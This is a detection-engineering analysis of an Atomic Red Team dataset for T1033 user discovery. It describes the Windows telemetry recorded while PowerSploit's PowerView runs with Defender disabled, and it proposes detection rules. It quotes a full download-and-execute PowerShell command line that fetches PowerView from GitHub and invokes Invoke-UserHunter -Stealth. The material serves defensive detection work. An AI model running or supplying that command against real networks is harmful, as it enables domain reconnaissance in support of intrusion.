# T1033-3: System Owner/User Discovery — Find computers where user has session - Stealth mode (PowerView)

## Technique Context

T1033 System Owner/User Discovery is a reconnaissance technique where adversaries gather information about user accounts and active sessions across systems in their target environment. This particular test uses PowerView's `Invoke-UserHunter -Stealth` function, a module from the PowerSploit framework designed to locate computers where a specific user has active sessions while minimizing network footprint. Rather than performing broad enumeration, the stealth variant focuses queries on domain controllers and commonly-accessed file servers to reduce lateral movement signatures.

PowerView's `Invoke-UserHunter` works by querying domain controllers for logged-on users via NetWkstaUserEnum and NetSessionEnum APIs, then correlating that with Active Directory data to identify where target users are currently authenticated. The stealth mode restricts queries to high-value targets likely to have many sessions, trading breadth for reduced detectability. This technique is heavily used in post-exploitation frameworks and red team toolkits, and its presence is a reliable indicator of an adversary mapping out where privileged users are active.

Detection of this technique typically focuses on PowerShell script block logging capturing PowerSploit module imports and `Invoke-UserHunter` invocations, network-level anomalies from SMB enumeration calls to multiple hosts, and process creation events showing PowerShell spawning with IEX (Invoke-Expression) loading remote content. The undefended version of this test is particularly valuable because Defender's AMSI blocking of PowerSploit is completely absent, allowing the full execution chain to appear in telemetry.

## What This Dataset Contains

This dataset spans 3 seconds (2026-03-14T23:04:59Z–23:05:02Z) and contains 120 events across three channels: 96 PowerShell events, 4 Security events, and 20 Sysmon events.

The Security channel (EID 4688) contains the key execution evidence. A child PowerShell process was spawned with the full ART command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose}`. This single event captures the full attack: TLS enforcement for the download, a direct GitHub fetch of PowerView, and the stealth enumeration invocation. Two separate `whoami.exe` launches (EID 4688) appear as part of the test framework pre/post check logic.

In the defended dataset, Defender's AMSI blocked PowerSploit execution, preventing the IEX payload from running. Here, with Defender disabled, the download and execution proceed fully — the difference is primarily visible in the PowerShell channel, which jumps from 41 events (defended) to 96 events, reflecting the full script block logging of PowerView loading and executing.

Sysmon adds texture to the execution. EID 1 (process creation) records `whoami.exe` launched from `powershell.exe` with `RuleName: technique_id=T1033`. EID 10 (process access) shows `powershell.exe` accessing `whoami.exe` memory, tagged `technique_id=T1055.001` (DLL injection). EID 8 (CreateRemoteThread) captures PowerShell creating a remote thread in an unknown target process near the end of execution — a Sysmon artifact of the PowerView LDAP query mechanism. EID 7 (image load) shows `urlmon.dll` loading into PowerShell, consistent with the `Invoke-WebRequest` download of PowerView. The two EID 17 named pipe events record the PowerShell hosting infrastructure pipes.

The PowerShell channel's 93 EID 4104 (script block) events include the PowerSploit content itself in fragmented form, plus the PowerShell error formatting internals that appear across all ART test executions. The 4103 module logging event and 4100 engine state events complete the channel.

## What This Dataset Does Not Contain

The dataset does not include network telemetry showing the actual GitHub download of PowerView.ps1, nor does it capture the LDAP queries and SMB enumeration calls that `Invoke-UserHunter -Stealth` would generate against domain controllers. No DNS channel events are present. Sysmon network connection (EID 3) events are absent for the outbound HTTPS connection to `raw.githubusercontent.com`, suggesting the Sysmon config's network monitoring did not capture this connection or it was filtered.

The PowerShell script block channel, while showing 93 EID 4104 events, samples only 20 events in this dataset — the PowerView.ps1 source code fragmented across script blocks is not directly visible in the samples, though it is present in the full dataset. No LDAP or WinRM channel events are included.

The dataset's three-second window captures the launch and near-immediate completion of the test, which means the full stealth enumeration may not have completed in a real-environment sense before cleanup.

## Assessment

This is a high-quality dataset for detection engineering against PowerSploit-based user hunting. The combination of the EID 4688 command line showing the exact GitHub URL and PowerView invocation, paired with the Sysmon image load of `urlmon.dll` and the process injection artifacts, gives multiple independently-actionable detection angles. The undefended version is particularly valuable because it confirms the technique executes successfully without AMSI interference, making it a ground-truth example of what fully-executed PowerView activity looks like in Windows telemetry.

The dataset is most useful for developing detections against download-and-execute PowerShell patterns, `Invoke-UserHunter` invocations, and PowerSploit module loads. The remote thread creation (EID 8) is an interesting secondary signal worth noting.

## Detection Opportunities Present in This Data

1. EID 4688 command line containing both `IWR` (or `Invoke-WebRequest`) and `IEX` (or `Invoke-Expression`) in a single PowerShell invocation targeting a GitHub raw content URL is a strong indicator of download-and-execute behavior.

2. EID 4688 command line containing `Invoke-UserHunter` combined with `-Stealth` flag is a near-unambiguous PowerSploit signature.

3. Sysmon EID 7 image load of `urlmon.dll` into `powershell.exe` indicates PowerShell is performing HTTP/HTTPS downloads, which combined with other context narrows to download-and-execute patterns.

4. Sysmon EID 8 (CreateRemoteThread) sourced from `powershell.exe` to an unknown target process is an anomalous behavior in the context of a user discovery operation and warrants investigation.

5. EID 4104 script block logging will contain fragments of the PowerView source if the full dataset is searched for keywords like `Invoke-UserHunter`, `NetWkstaUserEnum`, or `PowerSploit` — enabling content-based detection of PowerView usage.

6. Sysmon EID 10 process access from `powershell.exe` to `whoami.exe` tagged `technique_id=T1055.001` is worth correlating with the parent command line to identify recon wrapped in injection-tagged access patterns.
